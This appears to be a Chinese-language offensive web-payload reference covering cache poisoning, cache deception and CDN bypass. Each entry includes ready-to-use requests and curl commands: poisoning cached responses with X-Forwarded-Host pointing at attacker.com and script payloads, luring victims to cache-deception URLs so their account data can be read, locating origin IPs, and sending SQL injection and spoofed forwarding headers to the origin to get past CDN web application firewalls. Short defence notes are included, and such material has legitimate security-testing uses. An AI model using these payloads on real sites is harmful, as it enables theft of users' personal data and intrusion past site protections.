# 缓存与CDN安全

_3 条 web payload_

### 缓存投毒  `cache-poisoning`
_Web缓存投毒攻击_
子类：**缓存投毒** · tags: `cache` `poisoning` `web-cache`

**前置条件：**
- 目标使用缓存
- 缓存键配置不当

**攻击链：**

**探测缓存**
> 探测缓存状态
```
响应头: X-Cache: hit/miss
```
**语法解析：**
- `X-Cache` — 缓存状态头 _header_

**未键入头**
> 注入未键入头
```
X-Forwarded-Host: attacker.com
```
**语法解析：**
- `X-Forwarded-Host` — 常被用作缓存键但未包含在键中 _header_

**缓存投毒**
> 投毒缓存
```
GET /?q=test HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
**语法解析：**
- `attacker.com` — 恶意主机，将被缓存 _domain_

**Fat GET**
> Fat GET投毒
```
GET / HTTP/1.1
Host: target.com
Content-Length: 10

q=poisoned
```
**语法解析：**
- `Content-Length` — 包含请求体的GET请求 _header_

**WAF/EDR 绕过变体：**

**未键入头部(Unkeyed Headers)利用**
> 识别不包含在缓存键中但影响响应内容的HTTP头(如X-Forwarded-Host)，通过重复发送携带恶意头的请求将投毒响应存入缓存
```
# 常见未键入头:
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Original-URL: /malicious
X-Forwarded-Prefix: /evil

# 发现未键入头:
# 使用Param Miner Burp扩展自动检测
# 手动对比: 添加头后响应是否变化但缓存键相同

# 投毒步骤:
# 1. 发送带恶意头的请求直到缓存命中
# 2. 验证其他用户访问同一URL时收到投毒响应
```
**语法解析：**
- `# 常见未键入头:` — 主要命令 _command_
- `...` — 共11行 _value_

**参数伪装与HTTP/2专属头投毒**
> 利用UTM等追踪参数不被缓存键包含的特性注入恶意内容，或使用Fat GET请求体覆盖查询参数，HTTP/2独有伪头触发差异化处理
```
# 参数伪装(Parameter Cloaking):
# UTM参数通常不在缓存键中:
/page?utm_content=<script>alert(1)</script>
/page?callback=alert(1)&utm_source=x

# Fat GET投毒:
GET /api/data HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

q=<script>alert(1)</script>

# HTTP/2专属头:
:method: GET
:path: /
transfer-encoding: chunked
```
**语法解析：**
- `# 参数伪装(Parameter Cloaking):
# UTM参数通常不在缓存键中:
/page?utm_content=` — 注入代码 _value_
- `<script>` — HTML标签/事件处理器 _tag_
- `alert(1)` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_
- `
/page?callback=alert(1)&utm_source=x

# Fat GET投毒:
GET /api/data HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

q=` — 注入代码 _value_
- `<script>` — HTML标签/事件处理器 _tag_
- `alert(1)` — 注入代码 _value_
- `</script>` — HTML标签/事件处理器 _tag_
- `

# HTTP/2专属头:
:method: GET
:path: /
transfer-encoding: chunked` — 注入代码 _value_


**概述：** Web缓存投毒是利用缓存服务器的缓存键(Cache Key)与实际响应内容不一致的漏洞，通过在非缓存键的HTTP头或参数中注入恶意内容，使缓存服务器存储包含恶意payload的响应，后续访问相同URL的所有用户都将收到被投毒的响应

**漏洞原理：** 缓存投毒的根因在于缓存键通常只包含URL路径和少量参数，而Web应用可能会将非缓存键的HTTP头(如X-Forwarded-Host、X-Forwarded-Scheme)反射到响应中。当攻击者通过这些头注入恶意内容时，缓存服务器会将含有恶意内容的响应缓存并分发给所有用户

**利用方法：** 首先识别目标使用的缓存机制(通过Cache-Control、Age、X-Cache等响应头)，然后使用Param Miner等工具探测可被反射到响应中的非缓存键HTTP头，构造包含恶意JavaScript的头值(如X-Forwarded-Host: evil.com)，发送请求使缓存存储被投毒的响应，验证后续无恶意头的正常请求是否返回投毒内容

**防御措施：** 严格配置缓存键包含所有影响响应内容的参数和头部；对反射到响应中的HTTP头值进行严格的输入验证和编码；使用Vary头正确声明影响响应的HTTP头；配置缓存不缓存包含用户特定内容的响应；定期审计缓存配置和清除可疑缓存内容

---

### 缓存欺骗  `cache-deception`
_利用Web缓存和服务器路径解析的差异，诱导CDN/缓存层缓存包含敏感信息的动态页面_
子类：**Deception** · tags: `cache` `deception` `auth`

**前置条件：**
- 目标使用CDN或反向代理缓存
- 路径解析存在差异(后端忽略路径后缀)
- 缓存策略基于URL扩展名

**攻击链：**

**探测缓存行为**
> 检测目标的缓存层和缓存策略配置
_platform: linux_
```
# 检测是否存在缓存层:
curl -sI "http://target.com/" | grep -iE "x-cache|cf-cache|age:|via:|x-cdn|cache-control"

# 测试缓存策略(静态文件是否被缓存):
curl -sI "http://target.com/test.css" | grep -iE "x-cache|age"
curl -sI "http://target.com/test.js" | grep -iE "x-cache|age"
curl -sI "http://target.com/test.jpg" | grep -iE "x-cache|age"

# 对比动态页面:
curl -sI "http://target.com/account" | grep -iE "x-cache|age|cache-control"
```
**语法解析：**
- `X-Cache` — 缓存命中状态头(HIT/MISS) _value_
- `Age:` — 响应在缓存中存储的时间(秒) _value_
- `Via:` — 显示中间代理/缓存服务器 _value_

**路径混淆缓存欺骗**
> 在动态页面URL后附加静态文件扩展名触发缓存
```
# 核心技巧: 在动态页面URL后添加静态文件扩展名
# 后端将 /account/profile.css 解析为 /account (忽略不存在的路径)
# 缓存层看到 .css 扩展名，认为是静态资源并缓存

# 步骤1: 构造欺骗URL(以受害者身份访问)
curl -b "session=VICTIM_SESSION" "http://target.com/account/profile.css"

# 步骤2: 攻击者无需认证直接访问缓存内容
curl "http://target.com/account/profile.css"

# 多种路径变体:
curl "http://target.com/account/x.js"
curl "http://target.com/account/x.jpg"
curl "http://target.com/account/x.png"
curl "http://target.com/api/user/info/x.css"
curl "http://target.com/settings/x.svg"
```
**语法解析：**
- `/account/profile.css` — 后端解析为/account但缓存层认为是CSS文件 _value_
- `.css/.js/.jpg` — 常见的缓存触发扩展名 _value_

**高级缓存欺骗变体**
> 利用路径分隔符、参数和规范化差异的高级缓存欺骗
```
# 分隔符混淆(不同组件对路径分隔符理解不同):
curl "http://target.com/account;x.css"
curl "http://target.com/account%23x.css"
curl "http://target.com/account%3fx.css"

# 参数污染:
curl "http://target.com/account?cb=123.css"
curl "http://target.com/account/..%2fstatic/x.css"

# RPO (Relative Path Overwrite):
curl "http://target.com/account/..%2f..%2fstatic/style.css"

# Normalization差异:
curl "http://target.com/account/./x.css"
curl "http://target.com/account%2fx.css"
```
**语法解析：**
- `;x.css` — 分号在某些框架中是路径参数分隔符 _value_
- `%23` — #的URL编码，不同组件处理不同 _value_
- `..%2f` — ../的URL编码，可能绕过缓存层的路径匹配 _value_

**完整攻击流程验证**
> 演示从诱导缓存到窃取数据的完整攻击链
```
# 完整攻击演示:

# 1. 先确认动态页面包含敏感信息:
curl -b "session=VALID_SESSION" "http://target.com/account" | grep -i "email|phone|address|token"

# 2. 诱导受害者访问欺骗URL(通过钓鱼邮件/消息):
# 受害者点击: http://target.com/account/avatar.jpg
# 这会将其/account页面(含个人信息)缓存为"图片"

# 3. 攻击者访问同一URL获取缓存的敏感信息:
curl "http://target.com/account/avatar.jpg"
# 返回受害者的账户页面(包含邮箱、手机号、地址等)

# 4. 验证缓存命中:
curl -sI "http://target.com/account/avatar.jpg" | grep -i "x-cache"
# 期望看到: X-Cache: HIT
```
**语法解析：**
- `X-Cache: HIT` — 确认响应来自缓存而非源站 _value_

**WAF/EDR 绕过变体：**

**路径分隔符混淆**
> 利用缓存服务器与源站对分号、换行、井号等分隔符解析不一致触发缓存
```
# 利用缓存服务器对路径分隔符的差异解析
https://target.com/account/settings;.css
https://target.com/account/settings%0a.css
https://target.com/account/settings%23.css
https://target.com/account/settings%3f.css

# URL编码分隔符
https://target.com/account/settings%2f.css
https://target.com/account/settings%5c.css
```
**语法解析：**
- `# 利用缓存服务器对路径分隔符的差异解析` — 主要命令 _command_
- `...` — 共8行 _value_

**RPO相对路径覆盖**
> 利用相对路径覆盖（RPO）使浏览器请求敏感页面但缓存服务器按静态资源缓存
```
# Relative Path Overwrite
https://target.com/account/settings/..%2f..%2fstatic/style.css
https://target.com/account/settings/nonexistent.css

# 路径参数注入
https://target.com/account/settings;param=value/test.css
https://target.com/account/settings/test.js?_=1

# 不同缓存键操控
https://target.com/account/settings HTTP/1.1
X-Original-URL: /static/style.css
```
**语法解析：**
- `# Relative Path Overwrite` — 主要命令 _command_
- `...` — 共9行 _value_

**缓存与源站规范化差异**
> 利用CDN/反向代理与源站对URL规范化处理的差异，使缓存误缓存敏感内容
```
# Cloudflare/Varnish路径规范化差异
https://target.com/account/settings/.css
https://target.com/account/settings/test.avif
https://target.com/account/settings/x.woff2

# 双斜杠混淆
https://target.com//account//settings.css
https://target.com/account/settings%252f.css

# 利用Vary头缺失
curl -H "Accept: text/css" https://target.com/account/settings
```
**语法解析：**
- `# Cloudflare/Varnish路径规范化差异` — 主要命令 _command_
- `...` — 共9行 _value_


**概述：** Web缓存欺骗(Web Cache Deception)利用CDN/缓存层与后端服务器对URL路径的解析差异。当后端将/account/x.css按/account处理(返回用户信息)，而缓存层因.css扩展名将响应当作静态资源缓存时，攻击者可以诱导受害者访问该URL，然后直接获取缓存的敏感信息。

**漏洞原理：** 缓存层(CDN/Varnish/Nginx)和后端应用对同一URL路径的解析存在差异：1) 后端忽略URL中不存在的路径段 2) 缓存层根据扩展名决定缓存策略 3) 缓存策略未排除包含敏感数据的响应

**利用方法：** 利用流程：1) 探测缓存层和缓存策略 2) 找到包含敏感信息的动态页面 3) 构造带静态扩展名的欺骗URL 4) 诱导受害者访问该URL触发缓存 5) 攻击者无需认证访问缓存获取敏感数据

**防御措施：** 1) 敏感页面设置Cache-Control: no-store, private 2) 缓存层验证Content-Type与扩展名一致 3) 后端对不存在的路径返回404 4) 缓存key包含Cookie/Authorization 5) CDN配置只缓存明确的静态资源路径

---

### CDN绕过  `cdn-bypass`
_绕过CDN查找真实IP_
子类：**CDN** · tags: `cdn` `bypass` `recon`

**前置条件：**
- 目标使用CDN

**攻击链：**

**历史DNS**
> 查找未使用CDN时的IP
```
# DNS历史记录查询获取真实IP:
# 1. SecurityTrails(需要API Key):
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | jq '.records[].values[].ip'

# 2. ViewDNS:
curl -s "https://viewdns.info/iphistory/?domain=target.com"

# 3. DNS DB在线查询:
# https://dnsdb.io/
# https://securitytrails.com/
# https://completedns.com/

# 4. Censys搜索:
curl -s "https://search.censys.io/api/v2/hosts/search?q=target.com"   -u "API_ID:API_SECRET"

# 5. 使用FOFA:
# domain="target.com" && type="A"

# 6. 多地Ping对比:
nslookup target.com 8.8.8.8
nslookup target.com 1.1.1.1
```
**语法解析：**
- `DNS` — 域名解析记录 _concept_

**邮件头**
> 查看邮件源码中的Received头
```
# 通过邮件头泄露真实IP:
# 1. 触发目标站点发送邮件(注册/找回密码/订阅):
curl -d "email=attacker@gmail.com" "http://target.com/forgot-password"
curl -d "email=attacker@gmail.com" "http://target.com/subscribe"

# 2. 查看收到邮件的原始头(Gmail: 显示原始邮件):
# 查找以下字段中的IP:
# Received: from mail.target.com (203.0.113.50)
# X-Originating-IP: [203.0.113.50]
# Return-Path: <noreply@target.com>

# 3. 使用swaks发送邮件触发:
swaks --to attacker@gmail.com --from test@target.com --server target.com

# 4. 分析邮件头:
# 最底部的Received字段通常包含源服务器真实IP

# 5. 如果目标有RSS订阅:
# 订阅后查看请求来源IP
curl "http://target.com/rss" -v
```
**语法解析：**
- `Received` — 邮件传输路径 _header_

**DNS历史与证书透明度查询**
> 通过DNS历史、证书透明度、搜索引擎查找CDN背后的真实IP
```
# 1. DNS历史记录查询:
# SecurityTrails:
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | python3 -m json.tool

# 在线查询:
# https://viewdns.info/iphistory/?domain=target.com
# https://completedns.com/dns-history/
# https://dnshistory.org/dns-records/target.com

# 2. 证书透明度日志(CT Log):
curl -s "https://crt.sh/?q=target.com&output=json" |   python3 -c "import json,sys; [print(x['common_name'],x['name_value']) for x in json.load(sys.stdin)]"

# 3. Censys搜索:
# https://search.censys.io/search?q=services.tls.certificates.leaf.names%3Atarget.com

# 4. FOFA/Shodan搜索:
# FOFA: cert="target.com"
# Shodan: ssl.cert.subject.cn:target.com
```
**语法解析：**
- `crt.sh` — 证书透明度日志搜索引擎 _value_
- `SecurityTrails` — DNS历史记录查询API _value_
- `cert="target.com"` — FOFA语法搜索使用特定证书的IP _parameter_

**子域名与相关服务探测真实IP**
> 通过子域名、邮件记录、主动连接等方式发现真实IP
_platform: linux_
```
# 1. 子域名可能未经CDN:
for sub in mail ftp ssh vpn dev staging test api admin mx; do
  ip=$(dig +short ${sub}.target.com A 2>/dev/null | head -1)
  [ -n "$ip" ] && echo "${sub}.target.com → $ip"
done

# 2. MX记录(邮件服务器通常不走CDN):
dig +short target.com MX
dig +short $(dig +short target.com MX | awk '{print $2}') A

# 3. SPF记录中的IP:
dig +short target.com TXT | grep -i "spf"
# v=spf1 ip4:203.0.113.50 include:... → 203.0.113.50可能是真实IP

# 4. 触发目标服务器主动连接:
# 在目标网站留下一个URL(如头像、webhook)指向自己的服务器
# 查看连接IP(这是目标的出站IP，通常是真实IP):
# nc -lvp 8888

# 5. SSRF利用:
# 如果存在SSRF漏洞，让服务器连接外部获取IP
curl "http://target.com/api/fetch?url=http://your-server.com/log-ip"
```
**语法解析：**
- `dig +short target.com MX` — 查询邮件服务器记录，通常直接暴露真实IP _command_
- `SPF记录` — 邮件发送策略中包含的IP白名单 _value_

**验证真实IP并直接访问**
> 验证候选IP并直接访问绕过CDN防护
_platform: linux_
```
# 1. 验证候选IP是否是真实服务器:
REAL_IP="203.0.113.50"

# 直接IP访问(Host头指定域名):
curl -sI "http://${REAL_IP}/" -H "Host: target.com"

# HTTPS访问(忽略证书):
curl -sk "https://${REAL_IP}/" -H "Host: target.com"

# 2. 对比响应确认:
cdn_resp=$(curl -s "https://target.com/" | md5sum)
direct_resp=$(curl -sk "https://${REAL_IP}/" -H "Host: target.com" | md5sum)
echo "CDN: $cdn_resp"
echo "Direct: $direct_resp"
[ "$cdn_resp" = "$direct_resp" ] && echo "[+] CONFIRMED: Real IP!"

# 3. 修改hosts绕过CDN测试:
echo "${REAL_IP} target.com" | sudo tee -a /etc/hosts

# 4. 直接对真实IP进行渗透(绕过CDN的WAF):
nmap -sV -p 1-65535 ${REAL_IP}
# CDN的WAF通常只保护CDN入口，直接访问真实IP可绕过
```
**语法解析：**
- `-H "Host: target.com"` — 通过IP访问但指定Host头使服务器返回正确内容 _parameter_
- `-sk` — -s静默模式 -k忽略证书错误 _parameter_

**WAF/EDR 绕过变体：**

**绕过CDN WAF的多种技术**
> 利用真实IP和非标端口绕过CDN的WAF防护
```
# 找到真实IP后，CDN的WAF就被完全绕过了
# 但如果目标自身也有WAF，还需要:

# 1. 使用真实IP直接访问(绕过CDN WAF):
curl -sk "https://REAL_IP/vulnerable?id=1' OR 1=1--" -H "Host: target.com"

# 2. 如果CDN仅对常见端口做WAF:
# 扫描非标端口的Web服务:
nmap -sV -p 8080,8443,8888,9090,3000,4443,8000 REAL_IP

# 3. IPv6绕过(CDN可能只保护IPv4):
dig +short target.com AAAA
curl -6 "http://[IPv6_ADDRESS]/" -H "Host: target.com"

# 4. 源站IP白名单探测:
# 某些源站配置了仅允许CDN IP访问
# 尝试伪造CDN的IP:
curl -H "CF-Connecting-IP: 1.2.3.4" "http://REAL_IP/" -H "Host: target.com"
curl -H "X-Forwarded-For: CDN_IP" "http://REAL_IP/" -H "Host: target.com"
```
**语法解析：**
- `OR '1'='1'` — 逻辑永真 _keyword_
- `curl` — HTTP请求工具 _command_
- `-H` — 自定义请求头 _parameter_
- `X-Forwarded-For` — IP伪造头 _header_
- `nmap` — 端口扫描工具 _command_


**概述：** CDN隐藏了真实IP，绕过CDN是渗透测试的重要步骤。

**漏洞原理：** 信息泄露。

**利用方法：** DNS历史、子域名、邮件头、全网扫描

**防御措施：** 仅允许CDN IP访问源站

---
